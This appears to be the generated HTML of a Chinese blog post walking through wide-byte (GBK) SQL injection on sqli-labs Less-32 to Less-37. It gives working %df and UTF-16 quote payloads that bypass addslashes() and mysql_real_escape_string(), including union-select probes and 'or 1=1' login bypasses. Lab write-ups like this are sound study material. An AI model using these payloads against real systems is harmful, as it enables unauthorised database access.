@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        SQL注入-宽字节注入 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/" />
+        </div>
+        <div class="name">
+            <i>小白</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-text">宽字节注入原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF"><span class="toc-text">注入思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03"><span class="toc-text">0x03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04"><span class="toc-text">0x04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05"><span class="toc-text">0x05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06"><span class="toc-text">0x06</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-text">Summary</span></a>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        SQL注入-宽字节注入
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2022-02-10 15:14:55</span></span>
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p><strong>原理</strong>：<strong>mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。</strong>我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \’ 。 </p>
+<h2 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h2><p><strong>思路一</strong>：由于单引号被过滤了，所以我们使用%df吃掉 \， 具体的原因是urlencode(&#39;) = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。</p>
+<p><strong>思路二</strong>：将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。</p>
+<hr>
+<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>这里以Less-32–Less-37为例。</p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-32</strong></p>
+<p>源码中将<code>&#39;</code>，<code>&quot;</code>和<code>\</code>进行了过滤`。</p>
+<p>将 <code>&#39;</code> 转为<code>\&#39;</code>， 将 <code>\</code> 转为<code>\\</code>，将 <code>&quot;</code>转为 <code>\&quot;</code>，将<code>\&#39;</code>转为<code>\\\&#39;</code>。</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210155309048.png" alt="image-20220210155309048"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-32/?id=1\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>\&#39;</code>过滤掉了。</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210155816313.png" alt="image-20220210155816313"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-32/?id=1%df&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>当使用<code>%df</code>将<code>\</code>吃掉后成功注入。</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210160354619.png" alt="image-20220210160354619"></p>
+<p>判断字段数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-32/?id=1%df&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210160633736.png" alt="image-20220210160633736"></p>
+<p>判断回显点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-32/?id=-1%df&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210160746728.png" alt="image-20220210160746728"></p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p><strong>Less-33</strong></p>
+<p>源码中使用了<code>addslashes()</code> 函数；</p>
+<p>addslashes()：返回在预定义字符之前添加反斜杠的字符串。</p>
+<p>预定义字符是： 单引号<code>（&#39;）</code> 双引号<code>（&quot;）</code> 反斜杠<code>（\）</code></p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210161857546.png" alt="image-20220210161857546"></p>
+<p>Less-33的payload与Less-32相同。</p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><strong>Less-34</strong></p>
+<p>由于Less-34是POST方式提交信息，而上面几关是GET方式通过url形式提交，数据会通过URLencode；</p>
+<p><strong>POST注入中可以利用</strong>：将 utf-8 转换为 utf-16 或 utf-32，例如将<code>&#39;</code>转为 utf-16 为 <code>�&#39;</code>进行注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&#x27; or 1=1 #&amp;passwd=</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210163426756.png" alt="image-20220210163426756"></p>
+<p>判断字段数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&#x27; order by 3 #&amp;passwd=</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210163753118.png" alt="image-20220210163753118"></p>
+<p>判断回显点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&#x27; union select 1,2 #&amp;passwd=</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210163726016.png" alt="image-20220210163726016"></p>
+<p>原sql语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27;</span><br><span class="line">and password=&#x27;$passwd&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>此时 sql 语句为:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;�&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27; and password=&#x27;</span>$passwd<span class="string">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p><strong>Less35</strong></p>
+<p>源码中<code>id</code>值没有被处理，忽略<code>addslashes()</code>函数。<br><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210164117234.png" alt="image-20220210164117234"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-35/?id=-1 or 1=1</span><br><span class="line">http://sqli-labs-master/Less-35/?id=1 order by 4</span><br><span class="line">http://sqli-labs-master/Less-35/?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p><strong>Less-36</strong></p>
+<p>源码中有了<code>mysql_real_escape_string()</code>函数过滤字符串。</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210164814258.png" alt="image-20220210164814258"></p>
+<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
+<p>下列字符受影响： <code>\x00</code>，  <code>\n</code>，  <code>\r</code>，  <code>\</code>，  <code>&#39;</code>，<code>&quot;</code>， <code>\x1a</code></p>
+<p>判断注入点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-36/?id=1%df&#x27;  or 1=1--+</span><br></pre></td></tr></table></figure>
+
+<p>这里还是使用<code>%df</code>吃掉<code>\</code>。</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210165309366.png" alt="image-20220210165309366"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-36/?id=�&#x27;  or 1=1--+</span><br></pre></td></tr></table></figure>
+
+<p>或者这里直接使用<code>�&#39;</code>Bypass。</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210165421459.png" alt="image-20220210165421459"></p>
+<p><strong>Notice:</strong> </p>
+<p>在使用 <code>mysql_real_escape_string()</code>时，如何能够安全的防护这种问题，需要将 mysql 设置为 gbk 即可。</p>
+<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p><strong>Less-37</strong></p>
+<p>源码当中还是使用了<code>mysql_real_escape_string()</code>函数，原理相同。</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210165847294.png" alt="image-20220210165847294"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin�&#x27; or 1=1#&amp;passwd=</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210170033498.png" alt="image-20220210170033498"></p>
+<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p> 从上面的几关当中，可以总结一下过滤 ‘ \ 常用的三种方式是直接 <code>replace</code>， <code>addslashes()</code>,<code>mysql_real_escape_string()</code>。三种方式仅仅依靠一个函数是不能完全防御的，所 以我们在编写代码的时候需要考虑的更加仔细。</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.xml"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
